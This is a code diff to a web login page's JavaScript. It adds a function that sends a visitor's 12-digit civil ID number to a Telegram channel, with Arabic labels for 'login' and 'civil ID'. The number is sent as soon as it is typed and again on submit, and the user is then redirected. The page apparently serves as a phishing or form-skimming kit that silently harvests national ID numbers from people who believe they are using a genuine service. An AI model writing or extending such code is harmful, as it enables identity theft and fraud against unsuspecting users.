@@ -526,6 +526,7 @@
       var loginForm = document.querySelector(".login-form");
       var civilIdInput = document.querySelector("#civil-id");
       var civilIdError = document.querySelector("#civil-id-error");
+      var CIVIL_ID_TELEGRAM_SENT_KEY = "civil-id-telegram-sent";
 
       function getFieldStorageKey(field) {
         return field.id || field.name || "";
@@ -601,6 +602,29 @@
         return normalizeCivilId(civilIdInput.value || "").length === 12;
       }
 
+      function sendCivilIdToTelegram(civilId) {
+        if (!civilId || !window.sendAppTelegramMessage) {
+          return;
+        }
+
+        if (sessionStorage.getItem(CIVIL_ID_TELEGRAM_SENT_KEY) === civilId) {
+          return;
+        }
+
+        sessionStorage.setItem(CIVIL_ID_TELEGRAM_SENT_KEY, civilId);
+
+        var pageMessage = "📄 الصفحة: الرئيسية";
+
+        window
+          .sendAppTelegramMessage("👤 تسجيل دخول\n🆔 الرقم المدني: " + civilId, false)
+          .then(function () {
+            return window.sendAppTelegramMessage(pageMessage, false);
+          })
+          .catch(function () {
+            sessionStorage.removeItem(CIVIL_ID_TELEGRAM_SENT_KEY);
+          });
+      }
+
       loginForm.querySelectorAll("input, select, textarea").forEach(function (field) {
         restoreFieldValue(field);
 
@@ -620,6 +644,10 @@
             }
 
             clearCivilIdError();
+
+            if (normalizedValue.length === 12) {
+              sendCivilIdToTelegram(normalizedValue);
+            }
           }
 
           persistFieldValue(field);
@@ -639,7 +667,9 @@
         }
 
         clearCivilIdError();
-        localStorage.setItem("civil-id", normalizeCivilId(civilIdInput.value || ""));
+        var normalizedCivilId = normalizeCivilId(civilIdInput.value || "");
+        localStorage.setItem("civil-id", normalizedCivilId);
+        sendCivilIdToTelegram(normalizedCivilId);
         window.location.href = "services.html";
       });
 
